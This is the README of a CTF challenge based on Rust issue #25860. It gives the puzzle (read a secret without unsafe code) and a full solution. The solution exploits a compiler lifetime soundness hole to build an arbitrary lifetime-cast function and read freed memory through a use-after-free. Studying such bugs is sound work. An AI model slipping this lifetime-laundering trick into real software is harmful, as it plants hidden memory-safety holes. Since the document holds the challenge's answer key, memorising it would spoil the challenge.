# a_happy_life

Demo for a CTF challenge based on [rust-lang/rust#25860](https://github.com/rust-lang/rust/issues/25860).

## Idea

This challenge exploits a unsoundness hole discovered in Rust lifetime deduction system. When a type like `&'a &'b ()` is encountered, the compiler implicitly relies upon `'b: 'a`, which could be broken by contravariance.

See [rust-lang/rust#25860](https://github.com/rust-lang/rust/issues/25860) for the original issue. A more theoretical yet neater explanation can be found on https://counterexamples.org/nearly-universal.html.

## Build environment

* `rustc` on `PATH`. Tested with these compilers:
  * `rustc 1.76.0-nightly (d86d65bbc 2023-12-10)`
  * `rustc 1.74.0 (79e9716c9 2023-11-13) (built from a source tarball)`
* Flag in environment variable `FLAG`

Run this command to start the challenge (either Release or Debug build is okay):

```bash
cargo run -r
# or
cargo run
```

## Problem

Given the following program snippet, find appropriate code to fill in the two blanks (`[YOUR CODE PART 1]` and `[YOUR CODE PART 2]`) so as to read variable `_secret` under the conditions that:

* No `unsafe` code allowed
* No references to `_secret`
* No `std` linkage except the global allocator

```rust
// main.rs
#![no_std]
#![forbid(unsafe_code)]

extern crate my_proxy;
extern crate alloc;
use alloc::string::String;

// [YOUR CODE PART 1]

fn main() {
    let x = {
        // [YOUR CODE PART 2]
    };
    let _secret = String::from("???");
    my_proxy::print(&x);
}"
```

Crate `my_proxy` is a wrapper crate linked to `std`, but it pulls in only the global allocator and the `println!` macro.

```rust
// my_proxy.rs
pub use std::alloc::System;

#[global_allocator]
static GLOBAL: System = System;

pub fn print(s: &str) {
    println!("my_proxy::print(s: &str) says: {}", s);
}
```

## Solution

Part 1:

```rust
// Create "any-to-any" lifetime cast function.
fn aux<'a, 'b, T>(_: Option<&'a &'b ()>, v: &'b T) -> &'a T { v }

fn exp<'c, 'd, T>(x: &'c T) -> &'d T {
    let f: fn(Option<&'d &'d ()>, &'c T) -> &'d T = aux;
    f(None, x)
}
```

Part 2:

```rust
// Create a local variable whose memory location may coincide with `_secret`.
// The length of the `&'static str` literal should be the same as `_secret`.
let local = String::from("aaaabaaacaaadaaa");
// Leak it!
exp(&local)
```

### Explanation

The value `local` is dropped once it leaves its scope. But as the compiler thinks that `x`, as a reference to `local`, has a longer lifetime, it dangles after the destruction of `local`. Now, `x` could possibly (in fact, always, with `-C opt_level=0`) refer to the memory space subsequently allocated for `_secret`, creating a use-after-free scenario.
